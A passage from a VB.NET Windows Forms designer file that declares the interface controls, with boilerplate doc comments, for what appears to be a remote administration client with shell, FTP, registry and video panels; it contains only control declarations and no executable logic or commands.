    ''' The horizon dova lumiere sombre tool strip menu item
    ''' </summary>
    Friend WithEvents HorizonDovaLumiereSombreToolStripMenuItem As ToolStripMenuItem
    ''' <summary>
    ''' The BTN shortcut startup
    ''' </summary>
    Friend WithEvents btnShortcutStartup As Button
    ''' <summary>
    ''' The BTN shortcut startup all
    ''' </summary>
    Friend WithEvents btnShortcutStartupAll As Button
    ''' <summary>
    ''' The upload background worker
    ''' </summary>
    Friend WithEvents uploadBackgroundWorker As System.ComponentModel.BackgroundWorker
    ''' <summary>
    ''' The label18
    ''' </summary>
    Friend WithEvents Label18 As Label
    ''' <summary>
    ''' The status upload MGR
    ''' </summary>
    Friend WithEvents statusUploadMgr As TextBox
    ''' <summary>
    ''' The BTN FTP upload interrupt
    ''' </summary>
    Friend WithEvents btnFtpUploadInterrupt As Button
    ''' <summary>
    ''' The BTN FTP run
    ''' </summary>
    Friend WithEvents btnFtpRun As ToolStripMenuItem
    ''' <summary>
    ''' The BTN FTP run as
    ''' </summary>
    Friend WithEvents btnFtpRunAs As ToolStripMenuItem
    ''' <summary>
    ''' The tool strip separator2
    ''' </summary>
    Friend WithEvents ToolStripSeparator2 As ToolStripSeparator
    ''' <summary>
    ''' The label20
    ''' </summary>
    Friend WithEvents Label20 As Label
    ''' <summary>
    ''' The status download mnager
    ''' </summary>
    Friend WithEvents statusDownloadMnager As TextBox
    ''' <summary>
    ''' The BTN force download
    ''' </summary>
    Friend WithEvents btnForceDownload As Button
    ''' <summary>
    ''' The BTN force upload
    ''' </summary>
    Friend WithEvents btnForceUpload As Button
    ''' <summary>
    ''' The BTN force FTP
    ''' </summary>
    Friend WithEvents btnForceFtp As Button
    ''' <summary>
    ''' The BTN force shell
    ''' </summary>
    Friend WithEvents btnForceShell As Button
    ''' <summary>
    ''' The BTN destroy
    ''' </summary>
    Friend WithEvents btnDestroy As Button
    ''' <summary>
    ''' The button6
    ''' </summary>
    Friend WithEvents Button6 As Button
    ''' <summary>
    ''' The panel components list
    ''' </summary>
    Friend WithEvents panelComponentsList As MetroFramework.Controls.MetroTabControl
    ''' <summary>
    ''' The metro tab page2
    ''' </summary>
    Friend WithEvents MetroTabPage2 As MetroFramework.Controls.MetroTabPage
    ''' <summary>
    ''' The panel4
    ''' </summary>
    Friend WithEvents Panel4 As Panel
    ''' <summary>
    ''' The FTP BTN back
    ''' </summary>
    Friend WithEvents ftpBtnBack As Button
    ''' <summary>
    ''' The panel6
    ''' </summary>
    Friend WithEvents Panel6 As Panel
    ''' <summary>
    ''' The panel1
    ''' </summary>
    Friend WithEvents Panel1 As Panel
    ''' <summary>
    ''' The metro tab page1
    ''' </summary>
    Friend WithEvents MetroTabPage1 As MetroFramework.Controls.MetroTabPage
    ''' <summary>
    ''' The panel8
    ''' </summary>
    Friend WithEvents Panel8 As Panel
    ''' <summary>
    ''' The panel7
    ''' </summary>
    Friend WithEvents Panel7 As Panel
    ''' <summary>
    ''' The FTP view
    ''' </summary>
    Friend WithEvents ftpView As ListView
    ''' <summary>
    ''' The CLMN name
    ''' </summary>
    Friend WithEvents clmnName As ColumnHeader
    ''' <summary>
    ''' The CLMN size
    ''' </summary>
    Friend WithEvents clmnSize As ColumnHeader
    ''' <summary>
    ''' The CLMN last write time
    ''' </summary>
    Friend WithEvents clmnLastWriteTime As ColumnHeader
    ''' <summary>
    ''' The label2
    ''' </summary>
    Friend WithEvents Label2 As Label
    ''' <summary>
    ''' The BTN shortcut home
    ''' </summary>
    Friend WithEvents btnShortcutHome As Button
    ''' <summary>
    ''' The BTN shortcut recycle bin
    ''' </summary>
    Friend WithEvents btnShortcutRecycleBin As Button
    ''' <summary>
    ''' The label11
    ''' </summary>
    Friend WithEvents Label11 As Label
    ''' <summary>
    ''' The FTP BTN refresh
    ''' </summary>
    Friend WithEvents ftpBtnRefresh As ToolStripMenuItem
    ''' <summary>
    ''' The text edit user descriptor
    ''' </summary>
    Friend WithEvents txtEditUserDescriptor As TextBox
    ''' <summary>
    ''' The panel edit user descriptor
    ''' </summary>
    Friend WithEvents panelEditUserDescriptor As Panel
    ''' <summary>
    ''' The shell context menu
    ''' </summary>
    Friend WithEvents shellContextMenu As ContextMenuStrip
    ''' <summary>
    ''' The shell BTN cancel
    ''' </summary>
    Friend WithEvents shellBtnCancel As ToolStripMenuItem
    ''' <summary>
    ''' The label activity
    ''' </summary>
    Friend WithEvents lblActivity As Label
    ''' <summary>
    ''' The command history list
    ''' </summary>
    Friend WithEvents cmdHistoryList As ListBox
    ''' <summary>
    ''' The FTP operation history
    ''' </summary>
    Friend WithEvents ftpOperationHistory As ListBox
    ''' <summary>
    ''' The label upload name
    ''' </summary>
    Friend WithEvents lblUploadName As Label
    ''' <summary>
    ''' The label download name
    ''' </summary>
    Friend WithEvents lblDownloadName As Label
    ''' <summary>
    ''' The BTN FTP open
    ''' </summary>
    Friend WithEvents btnFtpOpen As ToolStripMenuItem
    ''' <summary>
    ''' The tool strip separator3
    ''' </summary>
    Friend WithEvents ToolStripSeparator3 As ToolStripSeparator
    ''' <summary>
    ''' The metro tab page3
    ''' </summary>
    Friend WithEvents MetroTabPage3 As MetroFramework.Controls.MetroTabPage
    ''' <summary>
    ''' The reg key holder
    ''' </summary>
    Friend WithEvents regKeyHolder As TreeView
    ''' <summary>
    ''' The BTN force regedit
    ''' </summary>
    Friend WithEvents btnForceRegedit As Button
    ''' <summary>
    ''' The label15
    ''' </summary>
    Friend WithEvents Label15 As Label
    ''' <summary>
    ''' The status regedit
    ''' </summary>
    Friend WithEvents statusRegedit As TextBox
    ''' <summary>
    ''' The reg value holder
    ''' </summary>
    Friend WithEvents regValueHolder As ListView
    ''' <summary>
    ''' The rg CLMN name
    ''' </summary>
    Friend WithEvents rgClmnName As ColumnHeader
    ''' <summary>
    ''' The rg CLMN type
    ''' </summary>
    Friend WithEvents rgClmnType As ColumnHeader
    ''' <summary>
    ''' The rg CLMN data
    ''' </summary>
    Friend WithEvents rgClmnData As ColumnHeader
    ''' <summary>
    ''' The panel10
    ''' </summary>
    Friend WithEvents Panel10 As Panel
    ''' <summary>
    ''' The label17
    ''' </summary>
    Friend WithEvents Label17 As Label
    ''' <summary>
    ''' The label19
    ''' </summary>
    Friend WithEvents Label19 As Label
    ''' <summary>
    ''' The label21
    ''' </summary>
    Friend WithEvents Label21 As Label
    ''' <summary>
    ''' The label22
    ''' </summary>
    Friend WithEvents Label22 As Label
    ''' <summary>
    ''' The reg key context menu
    ''' </summary>
    Friend WithEvents regKeyContextMenu As ContextMenuStrip
    ''' <summary>
    ''' The reg BTN key refresh
    ''' </summary>
    Friend WithEvents regBtnKeyRefresh As ToolStripMenuItem
    ''' <summary>
    ''' The tool strip separator5
    ''' </summary>
    Friend WithEvents ToolStripSeparator5 As ToolStripSeparator
    ''' <summary>
    ''' The reg BTN key delete
    ''' </summary>
    Friend WithEvents regBtnKeyDelete As ToolStripMenuItem
    ''' <summary>
    ''' The tool strip separator6
    ''' </summary>
    Friend WithEvents ToolStripSeparator6 As ToolStripSeparator
    ''' <summary>
    ''' The reg BTN key new subkey
    ''' </summary>
    Friend WithEvents regBtnKeyNewSubkey As ToolStripMenuItem
    ''' <summary>
    ''' The reg value context menu
    ''' </summary>
    Friend WithEvents regValueContextMenu As ContextMenuStrip
    ''' <summary>
    ''' The reg BTN value refresh
    ''' </summary>
    Friend WithEvents regBtnValueRefresh As ToolStripMenuItem
    ''' <summary>
    ''' The reg BTN value delete
    ''' </summary>
    Friend WithEvents regBtnValueDelete As ToolStripMenuItem
    ''' <summary>
    ''' The reg BTN value new value
    ''' </summary>
    Friend WithEvents regBtnValueNewValue As ToolStripMenuItem
    ''' <summary>
    ''' The BTN force video
    ''' </summary>
    Friend WithEvents btnForceVideo As Button
    ''' <summary>
    ''' The label23
    ''' </summary>
    Friend WithEvents Label23 As Label
    ''' <summary>
    ''' The status video
    ''' </summary>
    Friend WithEvents statusVideo As TextBox
    ''' <summary>
    ''' The FTP upload progress bar
    ''' </summary>
    Friend WithEvents ftpUploadProgressBar As MetroFramework.Controls.MetroProgressBar
    ''' <summary>
    ''' The FTP download progress bar
    ''' </summary>
    Friend WithEvents ftpDownloadProgressBar As MetroFramework.Controls.MetroProgressBar
    ''' <summary>
    ''' The table layout panel1
    ''' </summary>
    Friend WithEvents TableLayoutPanel1 As TableLayoutPanel
    ''' <summary>
    ''' The debug low level view
    ''' </summary>
    Friend WithEvents debugLowLevelView As RichTextBox
End Class
